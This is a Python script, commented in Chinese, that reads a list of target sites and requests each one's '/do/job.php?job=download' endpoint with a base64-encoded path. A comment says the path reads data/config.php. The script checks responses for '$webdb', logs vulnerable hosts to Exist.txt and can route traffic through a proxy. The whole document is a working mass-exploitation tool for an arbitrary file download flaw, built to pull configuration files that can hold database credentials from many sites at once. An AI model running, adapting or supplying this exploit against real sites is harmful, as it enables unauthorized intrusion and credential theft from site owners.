# -*- coding: utf-8 -*-

import requests
import re
import urllib
import base64
def dakai(filename):
    with open(filename,'r',encoding='utf-8') as fp:
        # url_list = []
        # for i in fp.readlines():
        #     url_list.append(i.strip())
        # return url_list
        return [i.strip() for i in fp.readlines()]  # 列表推到式

def main():
    for url in dakai('url.txt'):
        new_url = url + '/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
        # base64编码读取 data/config.php
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36'
        }

        try:
            # 可使用代理
            respone = requests.get(url=new_url, headers=headers, timeout=4, proxies={'http': 'http://127.0.0.1:10809'})

            if 'ph<' in respone.headers['Content-Type'] and '$webdb' in respone.text and respone.status_code == 200:
                print("存在漏洞:" + new_url)
                with open('Exist.txt', 'a+') as fp:
                    fp.write(url+'\n')
        except Exception as e:
            print(url + "err: " + str(e))


if __name__ == '__main__':
    main()
